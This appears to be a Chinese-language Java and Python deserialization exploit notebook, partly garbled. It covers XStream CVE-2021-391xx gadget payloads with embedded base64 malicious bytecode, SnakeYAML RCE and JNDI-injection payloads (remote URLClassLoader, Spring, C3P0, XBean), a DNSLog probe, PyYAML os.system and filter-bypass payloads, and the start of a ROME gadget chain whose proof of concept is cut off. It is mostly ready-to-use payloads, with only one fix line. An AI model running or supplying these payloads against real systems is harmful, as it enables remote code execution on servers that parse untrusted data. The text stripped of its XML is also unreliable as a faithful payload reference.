ABsQAAAAIADAAAAAYAAQAAABoADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB4ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABEADAAPAA0AEAARABIADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw== HelloTemplatesImpl false javax.xml.transform.Templates f5a5a608 javax.xml.transform.Templates CVE-2021-39141 JNDI注入 2 3 java.lang.Comparable false java.lang.Comparable compareTo java.lang.Object 0 PLAIN false int hash java.lang.String false hash java.lang.String javax.naming.InitialContext doLookup java.lang.String serialPersistentFields [Ljava.io.ObjectStreamField; serialPersistentFields java.lang.String CASE_INSENSITIVE_ORDER java.util.Comparator CASE_INSENSITIVE_ORDER java.lang.String serialVersionUID long serialVersionUID java.lang.String value [C value java.lang.String hash int serialPersistentFields [Ljava.io.ObjectStreamField; CASE_INSENSITIVE_ORDER java.util.Comparator serialVersionUID long value [C hash false java.lang.String java.lang.Object false false false false false ldap://127.0.0.1:1099/calc CVE-2021-39144 通过动态代理触发 NullProvider 的父类 ProviderSkeleton 的 invoke 方法, 再通过 triggerProbe 方法调用到 DTraceProbe 的 uncheckedTrigger 方法 protected void triggerProbe(Method var1, Object[] var2) { if (this.active) { ProbeSkeleton var3 = (ProbeSkeleton)this.probes.get(var1); if (var3 != null) { var3.uncheckedTrigger(var2); } } sun.tracing.dtrace.DTraceProbe#uncheckedTrigger public void uncheckedTrigger(Object[] var1) { try { this.implementing_method.invoke(this.proxy, var1); } catch (IllegalAccessException var3) { assert false; } catch (InvocationTargetException var4) { assert false; } } 最后就是invoke的调用 2 3 java.lang.Comparable true java.lang.Comparable java.lang.Comparable compareTo java.lang.Object java.lang.Runtime exec java.lang.String calc.exe JNDI注入 2 3 java.lang.Comparable true java.lang.Comparable java.lang.Comparable compareTo java.lang.Object javax.naming.InitialContext doLookup java.lang.String ldap://127.0.0.1:1099/calc CVE-2021-39145 JNDI注入, POC参考: https://x-stream.github.io/CVE-2021-39145.html https://github.com/R17a-17/JavaVulnSummary/blob/bd30150e9ea4ffd44a4be47cd63aedaa93f7ba22/xstream/src/main/java/com/r17a/xstream/cve/priorityqueue/CVE_2021_39145.java CVE-2021-39146 思路同CVE-2021-21346, 找到了SwingLazyValue的代替品UIDefaults$ProxyLazyValue#createValue:1105, 这里存在一个反射的调用 if (methodName != null) { Class[] types = getClassArray(args); Method m = c.getMethod(methodName, types); return MethodUtil.invoke(m, c, args); } POC test 0.75 525 700 0 zh_CN 0.75 525 700 1 lazyValue javax.naming.InitialContext doLookup ldap://127.0.0.1:1099/calc test test CVE-2021-39147/CVE-2021-39148 参考: https://www.anquanke.com/post/id/234537 https://www.anquanke.com/post/id/251814 特定JDK版本下载外部的任意代码 CVE-2021-39149 参考: https://xz.aliyun.com/t/10360 通过动态代理在HashMap调用hash的方法中使用动态代理调用hashCode static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16); } 动态代理指向 com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl#invoke public Object invoke( Object proxy, Method method, Object[] args ) throws Throwable { // Note that the declaring class in method is the interface // in which the method was defined, not the proxy class. Class cls = method.getDeclaringClass() ; InvocationHandler handler = (InvocationHandler)classToInvocationHandler.get( cls ) ; if (handler == null) { if (defaultHandler != null) handler = defaultHandler ; else { ORBUtilSystemException wrapper = ORBUtilSystemException.get( CORBALogDomains.UTIL ) ; throw wrapper.noInvocationHandler( \"\\\"\" + method.toString() + \"\\\"\" ) ; } } // handler should never be null here. return handler.invoke( proxy, method, args ) ; } 继续控制handler赋值为NullProvider然后调用ProviderSkeleton中的invoke方法, 进而跟进至triggerProbe, 此时传入的第二个参数为null, 后续就是 DTraceProbe 的 uncheckedTrigger 方法的 invoke 调用 map true java.lang.Object java.lang.Object hashCode Evil yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMdXRpbHMvRXZpbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEACnV0aWxzL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABoADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB4ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABEADAAPAA0AEAARABIADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw== -1 0 false com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getOutputProperties CVE-2021-39153 PriorityQueue.siftDownUsingComparator PackageWriter$2.compare BeanAdapter.get com.sun.javafx.fxml.BeanAdapter#get触发MethodUtil.invoke private Object get(String key) { Method getterMethod = key.endsWith(PROPERTY_SUFFIX) ? localCache.getMethod(key) : getGetterMethod(key); Object value; if (getterMethod != null) { try { value = MethodUtil.invoke(getterMethod, bean, (Object[]) null); } catch (IllegalAccessException exception) { throw new RuntimeException(exception); } catch (InvocationTargetException exception) { throw new RuntimeException(exception); } } else { value = null; } return value; } POC 2 0 0 false false false false false 0 0 0 0 0 0 0 Pwnr yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMdXRpbHMvRXZpbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEACnV0aWxzL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABoADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB4ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABEADAAPAA0AEAARABIADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw== -1 0 false getOutputProperties com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getOutputProperties 0 3 ricky outputProperties ricky CVE Reference 全部CVE请参考: https://x-stream.github.io/security.html 或者使用marshalsec工具生成payload java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream CommonsBeanutils rmi://127.0.0.1:2333/exp SankeYaml 大多数 java 项目用来处理数据基本上都是 xml 和 json 两种格式，yaml 相对来说少见一点，在我做过的一些代码审计项目里，使用 yaml 处理库最常见的就是 SnakeYaml，虽然还有 jyaml、YAMLBeans 之类的库，但我在真实环境里挺少有见到使用的。 先导入 snakeyaml 依赖 org.yaml snakeyaml 1.17 然后输出序列化一个 javabean import org.yaml.snakeyaml.Yaml; public class snakeyaml { public static void main(String[] args) { Yaml yaml = new Yaml(); Person person = new Person(\"ricky\", 18); String dump = yaml.dump(person); System.out.println(dump); } } 输出结果 !!Person {age: 18, name: ricky} !! 后面跟全类名，{} 里是属性名和属性值，中间使用逗号分隔，sankeyaml 特点在于它没有黑名单，不能设置私有属性，不能使用构造方法触发的 gadgets 所以采用直接对类的触发 !!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://127.0.0.1:1099/calc', autoCommit: true} YAML基本格式要求： YAML大小写敏感； 使用缩进代表层级关系； 缩进只能使用空格，不能使用TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格） 构造payload时需要按照这个格式要求进行构造, 否则会报错 import org.yaml.snakeyaml.Yaml; public class snakeyaml { public static void main(String[] args) { Yaml yaml = new Yaml(); yaml.load(\"!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://127.0.0.1:1099/calc',autoCommit: true}\"); } } ScriptEngineManager 基于javax.script.ScriptEngineManager的利用链, 本次利用是基于javax.script.ScriptEngineManager的利用链 TestEvil.java，需要实现ScriptEngineManager接口类，其中的静态代码块用于执行恶意代码，将其编译成TestEvil.class然后放置于第三方Web服务中： import javax.script.ScriptEngine; import javax.script.ScriptEngineFactory; import java.util.List; public class TestEvil implements ScriptEngineFactory { public TestEvil() throws Exception{ Runtime.getRuntime().exec(\"calc.exe\"); } @Override public String getEngineName() { return null; } @Override public String getEngineVersion() { return null; } @Override public List getExtensions() { return null; } @Override public List getMimeTypes() { return null; } @Override public List getNames() { return null; } @Override public String getLanguageName() { return null; } @Override public String getLanguageVersion() { return null; } @Override public Object getParameter(String key) { return null; } @Override public String getMethodCallSyntax(String obj, String m, String... args) { return null; } @Override public String getOutputStatement(String toDisplay) { return null; } @Override public String getProgram(String... statements) { return null; } @Override public ScriptEngine getScriptEngine() { return null; } } 另外，在已放置PoC.class的第三方Web服务中，在当前目录新建如下文件META-INF\\services\\javax.script.ScriptEngineFactory，其中内容为指定被执行的类名TestEvil, 然后调用POC即可弹出计算机 import org.yaml.snakeyaml.Yaml; public class snakeyaml { public static void main(String[] args) { Yaml yaml = new Yaml(); yaml.load(\"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\\\"http://127.0.0.1:8088/\\\"]]]]\"); } } 或者是打包成jar包进行加载, 参考: https://github.com/artsploit/yaml-payload https://www.cnblogs.com/wangshuo1/p/5697746.html 一定要放入META-INF\\services\\javax.script.ScriptEngineFactory才可执行jar包 SPI机制 参考: https://www.cnblogs.com/nice0e3/p/14514882.html Java的SPI机制，它会去寻找目标URL中META-INF/services目录下的名为javax.script.ScriptEngineFactory的文件，获取该文件内容并加载文件内容中指定的类。程序会java.util.ServiceLoder动态装载实现模块，在META-INF/services目录下的配置文件寻找实现类的类名，通过Class.forName加载进来,newInstance()反射创建对象,并存到缓存和列表里面。 调试发现，在调用完如下调用链获取到类名javax.script.ScriptEngineManager之后，会返回到调用链中的construct()函数中调用获取到的构造器的constrcut()方法，然后就会继续遍历解析得到yaml格式数据内的java.net.URLClassLoader类名和java.net.URL类名： constructDocument->constructObject->constructObjectNoCheck(新版统一为constructObject)->construct->getConstructor->getClassForNode->getClassForName 这整个流程返回了一个反射的class对象 protected Class getClassForName(String name) throws ClassNotFoundException { try { return Class.forName(name, true, Thread.currentThread().getContextClassLoader()); } catch (ClassNotFoundException var3) { return Class.forName(name); } } 从getConstructor出来后继续跟进construct方法 result = this.getConstructor(node).construct(node); 此时node的type值被改为 class javax.script.ScriptEngineManager, 在上一步获取反射对象并赋值给cl时, 执行了 node.setType(cl); 这一步, 将通过反射获取的对象赋值给 node实例中的 this.type, 所以在后续构造construct构造时触发的是 javax.script.ScriptEngineManager 的getDeclaredConstructors(无参构造) 随后 possibleConstructors 存入参数也就是 public javax.script.ScriptEngineManager(java.lang.ClassLoader), 将获取到的第一个元素强制转换为 Constructor 类型 回去遍历获取snode的值后对其 javax.script.ScriptEngineManager(java.lang.ClassLoader) 进行初始化, 其中 argumentList 参数为 URLClassLoader 类对象 接着就调用到 ScriptEngineManager 类的构造函数, 在init()中调用了initEngines()，跟进initEngines()，看到调用了ServiceLoader , 这个就是Java的SPI机制 后续会调用到 ServiceLoader.hasNext 然后就是跟进 ServiceLoader.hasNextService, 此处就回去读取 META-INF/services/javax.script.ScriptEngineFactory 获取实现类的信息 接着在 ServiceLoader$LazyIterator.nextService() 函数中调 Class.forName() 即通过反射来获取目标URL上的 TestEvil.class , 此时在Web服务端会看到被请求访问TestEvil.class 的记录, 接着c.newInstance()函数创建的 TestEvil 类实例传入 javax.script.ScriptEngineManager.cast 执行 漏洞修复 该漏洞涉及到了全版本，只要反序列化内容可控,那么就可以去进行反序列化攻击, 所以其修复方案为加入new SafeConstructor()类进行过滤或拒绝不安全的反序列化操作 Yaml yaml = new Yaml(new SafeConstructor()); JdbcRowSetImpl POC1 !!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://127.0.0.1:1099/calc',autoCommit: true} POC2(缩进代表层级关系, 也就是com.sun.rowset.JdbcRowSetImpl.dataSourceName) !!com.sun.rowset.JdbcRowSetImpl dataSourceName: 'ldap://127.0.0.1:1099/calc' autoCommit: true SnakeYaml在调用Yaml.load()反序列化的时候，会调用到JdbcRowSetImpl类的dataSourceName属性的setter方法即setDataSourceName() , 后续出发一系列利用链达到JNDI注入 Spring PropertyPathFactoryBean 需要在目标环境存在springframework相关的jar包 org.springframework spring-beans 5.3.14 org.springframework spring-context 5.3.14 POC1 !!org.springframework.beans.factory.config.PropertyPathFactoryBean targetBeanName: \"ldap://127.0.0.1:1099/calc\" propertyPath: ricky beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: [\"ldap://127.0.0.1:1099/calc\"] POC2 !!org.springframework.beans.factory.config.PropertyPathFactoryBean targetBeanName: \"ldap://127.0.0.1:1099/calc\" propertyPath: ricky beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: - \"ldap://127.0.0.1:1099/calc\" POC3 !!org.springframework.beans.factory.config.PropertyPathFactoryBean {targetBeanName: \"ldap://127.0.0.1:1099/calc\", propertyPath: ricky, beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory {shareableResources: [\"ldap://127.0.0.1:1099/calc\"]}} PropertyPathFactoryBean类的beanFactory属性可以设置一个远程的Factory，类似于JNDI注入的原理，当SnakeYaml反序列化的时候会调用到该属性的setter方法，通过JNDI注入漏洞成功实现反序列化漏洞的利用 Spring DefaultBeanFactoryPointcutAdvisor 需要在目标环境存在springframework相关的jar包 POC1 set: ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor adviceBeanName: beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: [] ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor adviceBeanName: \"ldap://127.0.0.1:1099/calc\" beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: [] POC2 set: ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor adviceBeanName: beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: - ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor adviceBeanName: \"ldap://127.0.0.1:1099/calc\" beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: - POC3 set: ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor {adviceBeanName: , beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory {shareableResources: []}} ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor {adviceBeanName: \"ldap://127.0.0.1:1099/calc\", beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory {shareableResources: []}} Apache XBean org.apache.xbean xbean-naming 4.20 org.apache.xbean xbean-reflect 4.15 POC1 !!org.apache.xbean.propertyeditor.JndiConverter {asText: \"ldap://127.0.0.1:1099/calc\"} POC2 !!org.apache.xbean.propertyeditor.JndiConverter asText: \"ldap://127.0.0.1:1099/calc\" POC3 !!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\"foo\",!!javax.naming.Reference [foo, \"test\", \"http://127.0.0.1:8079/\"],!!org.apache.xbean.naming.context.WritableContext []]] Apache Commons Configuration POC set: ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \"ldap://127.0.0.1:1099/calc\"]] C3P0 JndiRefForwardingDataSource POC1 !!com.mchange.v2.c3p0.JndiRefForwardingDataSource jndiName: \"ldap://127.0.0.1:1099/calc\" loginTimeout: 0 POC2 !!com.mchange.v2.c3p0.JndiRefForwardingDataSource {jndiName: \"ldap://127.0.0.1:1099/calc\", loginTimeout: 0} C3P0 WrapperConnectionPoolDataSource POC1 !!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource {userOverridesAsString: \"HexAsciiSerializedMap:xxx;\"} POC2 !!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource userOverridesAsString: \"HexAsciiSerializedMap:xxx;\" 其余的类似 fastjson 或 jackson 的JNDI注入均可在yaml中实现 URLDNS SnakeYAML在解析带键值对的集合的时候会对键调用hashCode方法因此会触发DNS解析，因此通过构造URL对象后面简单加个: 1让他成为一个mapping, 测试java.lang.String类是否存在 参考: SnakeYAML实现Gadget探测 key: [!!java.lang.String {}: 0, !!java.net.URL [null, \"[http://feycmi.dnslog.cn](http://feycmi.dnslog.cn/)\"]: 1] PyYaml 额外拓展PyYaml的知识 CVE-2020-1747 参考: https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1 通过yaml格式对PyYaml进行RCE # The `extend` function is overriden to run `yaml.unsafe_load` with # custom `listitems` argument, in this case a simple curl request - !!python/object/new:yaml.MappingNode listitems: !!str '!!python/object/apply:subprocess.Popen [[\"curl\", \"http://127.0.0.1/rce\"]]' state: tag: !!str dummy value: !!str dummy extend: !!python/name:yaml.unsafe_load While the format of python/object/apply can supply states for the object, we can use python/name to reference a python internal function (exec, eval etc). YAML中使用!!做类型强行转换 # !!python/object/apply # (or !!python/object/new) # args: [ ... arguments ... ] # kwds: { ... keywords ... } # state: ... state ... # listitems: [ ... listitems ... ] # dictitems: { ... dictitems ... } # or short format: # !!python/object/apply [ ... arguments ... ] The 5.3.1 fixes blocked the key extend and ^__.*__$ to disallow setting those key with the state parameter. We discovered that we can use python/object/new with type constructor (type is a type…) to create new types with some customized internal state. With this, we can bypass the state key block mechanism and freely set our object to something like this: !!python/object/new:type args: [\"z\", !!python/tuple [], {\"extend\": !!python/name:eval }] With this we can put our commands to listitems, and the constructor will call instance.extend(listitems), thus finish our RCE exploit. !!python/object/new:type args: [\"z\", !!python/tuple [], {\"extend\": !!python/name:eval }] listitems: \"\\x5f\\x5fimport\\x5f\\x5f('os')\\x2esystem('calc\\x2eexe')\" We changed _ to \\x5f and . to \\x2e to bypass the regex limitation tuple&map This is essentially the python code tuple(map(eval, \"PAYLOAD\")), and this works as map and tuple are both class constructor (so it doesnt use any function as apply calls) !!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ '__import__(\"os\").system(\"calc.exe\")' ]]] or like this 使用一个短横线加一个空格代表一个数组项 !!python/object/new:tuple - !!python/object/new:map - !!python/name:eval - [ '__import__(\"os\").system(\"calc.exe\")' ] oor like this !!python/object/new:tuple - !!python/object/new:map - !!python/name:eval - - '__import__(\"os\").system(\"calc.exe\")' other RCE 直接修改yml文件为： !!python/object:os.system [\"calc.exe\"] 再运行，失败（显示参数未传递：TypeError: system() takes exactly 1 argument (0 given)），尝试查看源码、并变换yml文件中语句格式，均未成功！（疑难点）。 修改为以下2种均成功，通过源码得知，new其实是调用了apply，他们的不同的地方是创建对象的方式，这里可以大致认为它们是一样的。 !!python/object/apply:os.system [\"calc.exe\"] !!python/object/new:os.system [\"calc.exe\"] 然后就是各种组合的payload !!python/object/apply:os.system - \"calc.exe\" !!python/object/new:os.system - \"calc.exe\" 还可以尝试其它的命令执行函数 !!python/object/apply:subprocess.check_output [\"calc.exe\"] !!python/object/apply:subprocess.check_output [[\"calc.exe\"]] !!python/object/apply:subprocess.check_output [[calc.exe]] !!python/object/new:subprocess.check_output [\"calc.exe\"] !!python/object/new:subprocess.check_output [[\"calc.exe\"]] !!python/object/new:subprocess.check_output [[calc.exe]] !!python/object/apply:subprocess.Popen [calc.exe] "},"javanote/ROME逐步分析.html":{"url":"javanote/ROME逐步分析.html","title":"ROME逐步分析","keywords":"","body":"ROME逐步分析 参考: https://blog.csdn.net/weixin_45805993/article/details/121298021 依赖: ROME-1.0.jar 整体流程 TemplatesImpl.getOutputProperties() NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) NativeMethodAccessorImpl.invoke(Object, Object[]) DelegatingMethodAccessorImpl.invoke(Object, Object[]) Method.invoke(Object, Object...) ToStringBean.toString(String) ToStringBean.toString() ObjectBean.toString() EqualsBean.beanHashCode() ObjectBean.hashCode() HashMap.hash(Object) HashMap.readObject(ObjectInputStream) 通过hashMap的put public V put(K key, V value) { if (key == null) return putForNullKey(value); // 跟进hash int hash = hash(key); ... final int hash(Object k) { int h = 0; if (useAltHashing) { if (k instanceof String) { return sun.misc.Hashing.stringHash32((String) k); } h = hashSeed; } // 跟进hashCode方法 h ^= k.hashCode(); ... 此处调用的是ObjectBean的hashCode方法 public int hashCode() { return this._equalsBean.beanHashCode(); } ObjectBean构造方法也提示了 this._equalsBean = new EqualsBean(beanClass, obj); 跟进EqualsBean的beanHashCode方法 public int beanHashCode() { return this._obj.toString().hashCode(); } 调用ToStringBean的toString方法 public String toString() { Stack stack = (Stack)PREFIX_TL.get(); String[] tsInfo = (String[])(stack.isEmpty() ? null : stack.peek()); String prefix; if (tsInfo == null) { String className = this._obj.getClass().getName(); prefix = className.substring(className.lastIndexOf(\".\") + 1); } else { prefix = tsInfo[0]; tsInfo[1] = prefix; } // 跟进private方法 return this.toString(prefix); } private String toString(String prefix) { StringBuffer sb = new StringBuffer(128); try { // 获取javax.xml.transform.Templates的getter和setter存入PropertyDescriptor中 PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; i 关键就是BeanIntrospector.getPropertyDescriptors(_beanClass);这行代码，它获取类的属性的getter和setter 获取getter/setter的逻辑是，先从_introspected这个HashMap中获取(相当于一个缓存)，一开始肯定获取不到，所以会调用getPDs方法去获取，获取到之后再缓存到_introspected中，获取的逻辑比较清晰，和大部分获取java bean的getter/setter的逻辑基本一样：先获取所有方法，然后根据方法名来获取getter和setter，比如getter就是开头是\"get\"或\"is\"，由于这里不是根据属性名匹配的getter，所以只需要考虑开头就行了，不需要匹配属性名，setter同理。获取到getter的PropertyDescriptor后，建立PropertyName(getter名字去掉get且第四个字符小写)和PropertyDescriptor的映射关系放入HashMap中 假设我们设置的_beanClass是Templates，那么获取到的getter就只有getOutputProperties了。 也就是获取的只是javax.xml.transform.Templates的getter和setter, 而javax.xml.transform.Templates中只有唯一的getOutputProperties方法即可调用到此方法 然后HashMap可替换的类 // Properties Map properties = new Properties(); properties.put(objectBean, \"anything\"); // Hashtable Map hashtable = new Hashtable(); hashtable.put(objectBean, \"anything\"); 然后ToStringBean也可直接用ObjectBean代替, 因为初始化ObjectBean时会自动给this._toStringBean赋值为ToStringBean对象, 相当于变相调用 POC package ROME; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.syndication.feed.impl.ObjectBean; import com.sun.syndication.feed.impl.ToStringBean; import javassist.ClassPool; import org.apache.commons.codec.binary.Base64; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URLEncoder; import java.util.Map; import java.util.Properties; /** * TemplatesImpl.getOutputProperties() * NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) * NativeMethodAccessorImpl.invoke(Object, Object[]) * DelegatingMethodAccessorImpl.invoke(Object, Object[]) * Method.invoke(Object, Object...) * ToStringBean.toString(String) * ToStringBean.toString() * ObjectBean.toString() * EqualsBean.beanHashCode() * ObjectBean.hashCode() * HashMap.hash(Object) * HashMap.readObject(ObjectInputStream) **/ public class ROME { public static void main(String[] args) throws Exception{ TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{ 